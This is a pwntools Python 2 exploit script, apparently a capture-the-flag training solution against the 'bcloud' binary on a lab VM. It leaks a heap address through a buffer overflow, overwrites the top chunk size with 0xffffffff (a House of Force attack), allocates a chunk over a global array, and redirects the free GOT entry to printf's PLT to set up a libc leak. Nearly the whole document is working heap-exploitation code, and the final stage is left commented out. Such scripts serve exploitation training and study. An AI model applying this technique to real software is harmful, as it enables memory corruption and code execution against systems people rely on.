from pwn import *
import string

context.terminal = ['tmux', 'splitw', '-h']
ssh = ssh("jinblack", "192.168.56.102")
# p = remote("training.jinblack.it", 2011)
r = ssh.process("./bcloud")
gdb.attach(r,'''
    # b *0x08048a19
    c
    ''')

def new_note(size, content):
    r.sendline("1")
    r.recvuntil("content:")
    r.sendline("%d" % size)
    r.recvuntil("content:")
    r.sendline(content)

def edit_note(id_, content):
    r.sendline("3")
    r.recvuntil("id:")
    r.sendline("%d" % id_)
    r.recvuntil("content:")
    r.send(content)

def delete_note(id_):
    r.sendline("4")
    r.recvuntil("id:")
    r.sendline("%d" % id_)
    return u32(r.recv(4))


read_got = 0x0804b00c
free_got = 0x0804b014
SIZES_ARRAY = 0x0804b0a0
printf_plt = 0x080484d0

raw_input("wait")

context.log_level = "debug"

r.recvuntil(":")
r.send("A"*0x3f+"B")
r.recvuntil("B")

leak = u32(r.recv(4))
print "leak %#x" % leak
r.recvuntil("Org:")
r.send("B" * 0x40)
raw_input("wait 2")
r.recvuntil("Host:")
r.sendline("D"*4+"EEEE" + p32(0xffffffff))


heap_base = leak - 0x160
print "heap leak  %#x" % leak
print "heap base  %#x" % heap_base
top_chunk = heap_base + 0x258
print "top_chunk  %#x" % top_chunk

to_malloc = u32(p32((SIZES_ARRAY - top_chunk - 20) & 0xffffffff, sign = "unsigned"), sign = "signed")

print "malloc size = %d (%x)" % (to_malloc, to_malloc)
new_note(to_malloc, "")

free_got = 0x0804b014
atoi_got = 0x0804b03c

payload = p32(4)
payload += p32(4)
payload += "\x00" * 120
payload += p32(free_got)
payload += p32(atoi_got)

new_note(len(payload), payload)
edit_note(0, p32(printf_plt))
r.recvuntil("--->>")
r.recvuntil("--->>")

# atoi_libc = delete_note(4)

r.interactive()